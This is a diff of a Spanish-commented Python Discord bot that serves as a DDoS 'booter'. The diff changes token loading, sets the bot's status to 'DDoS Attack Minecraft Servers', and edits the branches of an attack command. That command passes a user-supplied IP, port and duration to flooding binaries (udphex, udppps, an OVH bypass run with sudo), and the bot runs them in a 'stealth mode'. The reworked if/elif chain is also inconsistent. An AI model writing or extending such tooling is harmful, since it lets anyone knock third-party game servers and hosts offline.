@@ -11,25 +11,30 @@ intents = discord.Intents.default()
 intents.message_content = True
 bot = commands.Bot(command_prefix=BOT_PREFIX, intents=intents, help_command=None)
 
-# ========== SISTEMA DE TOKEN ==========
-def get_or_request_token():
+# ========== SISTEMA DE TOKEN (ENV VAR or token.txt) ==========
+def get_token():
     token_file = 'token.txt'
+    env_token = os.getenv('KEYS')
 
-    if os.path.exists(token_file):
+    if env_token:
+        print("[INFO] Token cargado desde la variable de entorno 'KEYS'")
+        return env_token
+    elif os.path.exists(token_file):
         try:
             with open(token_file, 'r') as f:
-                saved_token = f.read().strip()
-                if saved_token:
+                file_token = f.read().strip()
+                if file_token:
                     print(f"[INFO] Token cargado desde {token_file}")
-                    return saved_token
-        except:
-            pass
+                    return file_token
+        except Exception as e:
+            print(f"[ERROR] No se pudo leer {token_file}: {e}")
 
     print("\n" + "="*60)
     print("CONFIGURACIÓN REQUERIDA")
     print("="*60)
     print("1. Discord Developers → Applications → Bot → Copy Token")
-    print("2. Pega el token aquí")
+    print("2. Opción 1: Define la variable de entorno 'KEYS'")
+    print("   Opción 2: Pega el token aquí (se guarda en token.txt)")
     print("="*60)
 
     import getpass
@@ -45,7 +50,7 @@ def get_or_request_token():
         print(f"[INFO] Token guardado en {token_file}")
         return user_token
     except Exception as e:
-        print(f"[ERROR] No se pudo guardar: {e}")
+        print(f"[ERROR] No se pudo guardar {token_file}: {e}")
         return user_token
 
 # ========== BOT CONFIGURADO ==========
@@ -55,7 +60,7 @@ async def on_ready():
     print(f'[✓] Modo sigiloso: ACTIVADO')
     print(f'[✓] Prefijo: {BOT_PREFIX}')
     print(f'[✓] Métodos: udp, udphex, udppps, ovh, tcp, tcp-syn, httpsrequest, udppayload, udpflood, udpbypass')
-    await bot.change_presence(activity=discord.Game(name="Attack Minecraft Servers 0.15, 1.1.5, 1.20"))
+    await bot.change_presence(activity=discord.Game(name="DDoS Attack Minecraft Servers"))
 
 # ========== EJECUCIÓN SILENCIOSA ==========
 async def ejecutar_silencioso(comando: str, desc: str = ""):
@@ -102,17 +107,17 @@ async def attack(ctx, metodo: str = None, ip: str = None, port: str = None, tiem
         desc = "UDP Flood"
 
     # ========== UDPHEX ==========
-    if metodo == 'udphex':
+    elif metodo == 'udphex':
         comando = f'./udphex {ip} {port_int} {tiempo_int}'
         desc = "UDPHEX"
 
     # ========== UDPPPS ==========
-    if metodo == 'udppps':
+    elif metodo == 'udppps':
         comando = f'./udppps {ip} {port_int} {tiempo_int}'
         desc = "UDPPPS"
 
     # ========== OVH ==========
-    elif metodo == 'ovh':
+    if metodo == 'ovh':
         comando = f'sudo ./ovh {ip} {port_int} 20 -1 {tiempo_int}'
         desc = "OVH Bypass"
 
@@ -208,7 +213,7 @@ if __name__ == "__main__":
     print("BOT UDP - TODOS LOS MÉTODOS ACTIVOS")
     print("="*60)
 
-    TOKEN = get_or_request_token()
+    TOKEN = get_token()
 
     if not TOKEN or len(TOKEN) < 10:
         print("[ERROR] Token inválido")
